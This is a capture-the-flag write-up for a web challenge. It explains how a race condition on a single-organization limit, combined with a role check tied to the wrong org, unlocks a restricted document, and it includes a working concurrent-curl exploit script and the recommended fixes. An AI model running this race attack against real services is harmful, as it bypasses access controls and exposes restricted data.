# Flag Org — Writeup

**Category:** Web · **Points:** 474 · **Author:** depro0x
**Target:** `https://flag-org-7a254c2e3a79.web.bupcopc.tech`

## Flag

```
bupctf{Rac3_t0_4dMiN_WR0ng_0Rg_ch3ck}
```

The flag name spells out the bug: **race to admin** + **wrong-org check**.

---

## 1. Recon

"Orbit" is a small Flask workspace app (`Server: gunicorn`, signed `orbit_session` cookie).
Mapping the app surface, the entire route set is tiny:

| Route | Purpose |
|---|---|
| `GET/POST /register`, `/login`, `/logout` | auth |
| `GET /dashboard` | lists your memberships + public orgs |
| `POST /org/create` | create a new org — creator becomes **admin** |
| `POST /org/join-flag` | join the public **Flag** org (id 1) — you become **user** |
| `GET /org/<int:id>` | org page; renders a doc if you're a member |
| `POST /org/<int:id>/leave` | leave |

The signed session decodes to just `{"_permanent": true, "user_id": N}` — no role/plan
data client-side, so the cookie isn't the target (and the secret isn't in the flask-unsign
wordlist — it's random).

Registering shows user ids increment `1 … 3` while I only made 2 accounts, i.e. **`user_id 2`
is a seeded user** — the owner of the pre-created **Flag** org.

## 2. The locked document

Joining **Flag** (org id 1) makes you `Member · user`, and the "Internal notes" card is gated:

```html
<h2>Internal notes</h2> <span class="meta">Restricted</span>
<div class="locked"><p>You don’t have permission to view this document.</p></div>
```

Creating **your own** org makes you `Member · admin`, but new orgs only carry a placeholder
"Overview" card — the secret document lives **only on Flag (org 1)**.

So the doc is **role-gated**: it unlocks for an `admin`/`owner`, but the only way to obtain a
non-`user` role is to *create* an org — and you can't create/claim "Flag" (name is reserved,
case-insensitive: `Flag`/`flag`/`FLAG` → *"That name is unavailable."*).

### Things that did **not** work (confirming the intended path)
- Mass-assignment of `role`/`is_admin`/`owner` on `/org/create` and `/org/join-flag` → ignored.
- Mass-assignment of `plan`/`premium` on `/register` → ignored.
- Query-param unlocks (`?role=admin`, `?admin=1`, …) → still locked.
- Forging the session cookie → secret not crackable.
- Accessing `/org/1` while admin of *another* org but **not** a Flag member → `302 /dashboard`
  (membership *existence* is correctly scoped to the URL's org).

## 3. The real bug — two flaws that combine

The challenge description stresses: *"Free accounts are limited to a single organization."*
That single-org limit is the load-bearing security control, and it has a **TOCTOU race**:

1. **Race condition on the org limit.** `join`/`create` check "membership count `< 1`" and then
   insert, non-atomically. Firing many `join-flag` + `create` requests **concurrently** lets
   several pass the check before any insert lands.
2. **Wrong-org role check on the document.** `/org/<id>` verifies you are a member of that org,
   but the *document* authorization looks at whether you hold an `admin` role in **any**
   membership row — not specifically in the org being viewed.

Individually each is limited; together, holding a `user` membership in **Flag** *and* an
`admin` membership in an org you created makes the Flag doc treat you as admin.

## 4. Exploit

```bash
B="https://flag-org-7a254c2e3a79.web.bupcopc.tech"

# register + login a fresh account
U="race$RANDOM"
curl -sk -c r.txt      -o /dev/null -X POST "$B/register" --data "username=$U&password=pass1234"
curl -sk -c r.txt -b r.txt -o /dev/null -X POST "$B/login"    --data "username=$U&password=pass1234"

# RACE: fire join-flag and create concurrently to beat the "single org" limit
for i in $(seq 1 15); do
  curl -sk -b r.txt -o /dev/null -X POST "$B/org/join-flag" &
  curl -sk -b r.txt -o /dev/null -X POST "$B/org/create" --data "name=r${i}_$RANDOM" &
done
wait

# now you're a member of Flag (user) AND admin of orgs you created -> "4 / 1"
curl -sk -b r.txt "$B/org/1" | sed -n '/doc-card/,/\/section/p'
```

Result — the limit is bypassed (`4 / 1` memberships) and the Flag document unlocks:

```html
<h2>Internal notes</h2> <span class="meta">Restricted</span>
<pre class="doc-body">bupctf{Rac3_t0_4dMiN_WR0ng_0Rg_ch3ck}</pre>
```

## 5. Fix

- Enforce the membership limit **atomically** (unique constraint / `SELECT … FOR UPDATE` /
  a single transactional `INSERT … WHERE (count) < limit`), not check-then-insert.
- Authorize the document against the role of the membership **for the org being viewed**
  (`membership.org_id == requested_org AND membership.role in {admin, owner}`), never against
  "any admin membership the user holds".

## 6. Takeaways

- A per-user resource cap enforced with check-then-act is a classic **TOCTOU**; hammer it in
  parallel.
- Always confirm authorization is scoped to the **specific object** requested — a role check
  that isn't tied to the target object is a broken-access-control (IDOR-adjacent) bug.
